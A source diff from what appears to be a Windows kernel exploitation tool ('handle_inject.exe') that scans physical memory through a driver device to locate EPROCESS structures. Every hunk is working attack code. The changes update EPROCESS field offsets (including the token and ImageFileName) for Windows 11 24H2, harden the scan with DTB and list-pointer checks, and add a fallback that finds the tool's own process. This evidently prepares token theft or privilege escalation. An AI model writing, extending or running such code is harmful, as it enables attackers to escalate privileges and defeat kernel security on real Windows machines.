@@ -169,7 +169,8 @@ static EpOff ep_offsets(DWORD build)
     o.pid   = 0x440;
     o.token = 0x4B8;
     o.links = 0x448;
-    o.name  = 0x5A8;
+    /* Win11 24H2 (build 26100+) shifted ImageFileName by 0x10 */
+    o.name  = (build >= 26100) ? 0x5B8 : 0x5A8;
     /* ObjectTable and Protection vary by build */
     if (build < 14393) {        /* 1507/1511 */
         o.obj_table  = 0x518;
@@ -210,29 +211,69 @@ static uint64_t kva_to_pa(uint64_t cr3, uint64_t va)
  * §4  EPROCESS PHYSICAL SCAN
  * ══════════════════════════════════════════════════════════════════════════ */
 
-/* Scan all physical ranges for an EPROCESS matching name+pid combo.
- * Pass pid=0 to match by name only (first match). */
+/* Scan physical RAM for an EPROCESS matching name+pid.
+ * Outer stride: 4KB pages.  Inner stride: 16 bytes (pool alignment).
+ * Validates DTB (page-aligned, >64KB), Flink/Blink (canonical kernel VAs),
+ * and tries multiple ImageFileName offsets for Win11 24H2 compatibility. */
 static uint64_t find_eproc_pa(const EpOff *o, const char *name, DWORD pid)
 {
+    /* Name offsets to try — covers Win10 through Win11 24H2 */
+    static const int name_offsets[] = { 0x5A8, 0x5B8, 0x5B0, 0x5C0 };
+    const int N_NOFF = (int)(sizeof name_offsets / sizeof name_offsets[0]);
+    static uint8_t page[0x1000];
+    uint64_t progress = 0;
+
+    /* All checks that read within page: need sub + max(off) + 15 <= 0x1000.
+     * Fixed fields: DTB(+0x028), PID(+0x440), Flink(+0x448), Blink(+0x450).
+     * Blink end = sub + 0x450 + 8 = sub + 0x458. So sub_max = 0xBA8. */
+    const int sub_max = 0x1000 - 0x458;
+
     for (int r = 0; r < g_nranges; r++) {
         uint64_t base = g_ranges[r].base;
         uint64_t end  = base + g_ranges[r].size;
-        for (uint64_t pa = base; pa + 0x900 < end; pa += 0x10) {
-            char imname[16]; uint8_t buf16[16];
-            if (!phys_read(pa + o->name, buf16, 15)) continue;
-            memcpy(imname, buf16, 15); imname[15] = 0;
-            if (_stricmp(imname, name) != 0) continue;
-            if (pid != 0) {
-                uint64_t found_pid = phys_read64(pa + o->pid);
-                if ((DWORD)found_pid != pid) continue;
+        for (uint64_t page_pa = base; page_pa + 0x1000 <= end; page_pa += 0x1000) {
+            if (page_pa - progress >= 0x40000000ULL) {
+                printf("  [scan] %5" PRIu64 " MB...\r",
+                       (page_pa) >> 20);
+                fflush(stdout);
+                progress = page_pa;
             }
-            /* Validate DTB: must be page-aligned and reasonable */
-            uint64_t dtb = phys_read64(pa + o->dtb);
-            if (!dtb || (dtb & 0xFFF) != 0) continue;
-            /* Validate PID: small nonzero */
-            uint64_t found_pid2 = phys_read64(pa + o->pid);
-            if (found_pid2 == 0 || found_pid2 > 0x10000) continue;
-            return pa;
+            if (!phys_read(page_pa, page, 0x1000)) continue;
+
+            for (int sub = 0; sub <= sub_max; sub += 0x10) {
+                /* PID check (QWORD at +0x440) */
+                uint64_t epid;
+                memcpy(&epid, page + sub + o->pid, 8);
+                if (pid != 0 && (DWORD)epid != pid) continue;
+                if (epid == 0 || epid > 0x10000) continue;
+
+                /* DTB: page-aligned and realistic */
+                uint64_t dtb;
+                memcpy(&dtb, page + sub + o->dtb, 8);
+                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+
+                /* Flink/Blink must be canonical kernel VAs */
+                uint64_t flink, blink;
+                memcpy(&flink, page + sub + 0x448, 8);
+                memcpy(&blink, page + sub + 0x450, 8);
+                if ((flink >> 48) != 0xFFFF) continue;
+                if ((blink >> 48) != 0xFFFF) continue;
+
+                /* ImageFileName: try multiple offsets */
+                uint64_t eproc_pa = page_pa + (uint64_t)sub;
+                for (int ni = 0; ni < N_NOFF; ni++) {
+                    int noff = name_offsets[ni];
+                    uint8_t nbuf[16] = {0};
+                    if (!phys_read(eproc_pa + noff, nbuf, 15)) continue;
+                    if (!nbuf[0] || nbuf[0] < 0x20 || nbuf[0] > 0x7E) continue;
+                    if (_stricmp((char*)nbuf, name) != 0) continue;
+                    printf("  [+] EPROCESS PA=0x%012" PRIX64
+                           "  PID=%lu  name=%s  DTB=0x%llX  off_name=+0x%X\n",
+                           eproc_pa, (DWORD)epid, nbuf,
+                           (unsigned long long)dtb, noff);
+                    return eproc_pa;
+                }
+            }
         }
     }
     return 0;
@@ -526,17 +567,14 @@ int main(int argc, char **argv)
     if (!own_pa)
         own_pa = find_eproc_by_pid_chain(system_pa, &o, own_pid);
     if (!own_pa) {
-        /* Last resort: scan for any process with our PID */
-        for (int r = 0; r < g_nranges && !own_pa; r++) {
-            uint64_t base = g_ranges[r].base, end = base + g_ranges[r].size;
-            for (uint64_t pa = base; pa + 0x900 < end; pa += 0x10) {
-                uint64_t p = phys_read64(pa + o.pid);
-                if ((DWORD)p != own_pid) continue;
-                uint64_t dtb = phys_read64(pa + o.dtb);
-                if (!dtb || (dtb & 0xFFF)) continue;
-                own_pa = pa; break;
-            }
+        /* Last resort: use process name derived from argv[0] or exe name */
+        char own_name[64] = "handle_inject.exe";
+        char exe_buf[MAX_PATH];
+        if (GetModuleFileNameA(NULL, exe_buf, sizeof exe_buf)) {
+            char *last = strrchr(exe_buf, '\\');
+            if (last) strncpy(own_name, last+1, sizeof own_name - 1);
         }
+        own_pa = find_eproc_pa(&o, own_name, own_pid);
     }
     if (!own_pa) { puts("[-] own EPROCESS not found"); close_dev(); return 1; }
     printf("[+] Own EPROCESS PA: %016" PRIx64 " (PID %lu)\n", own_pa, (unsigned long)own_pid);
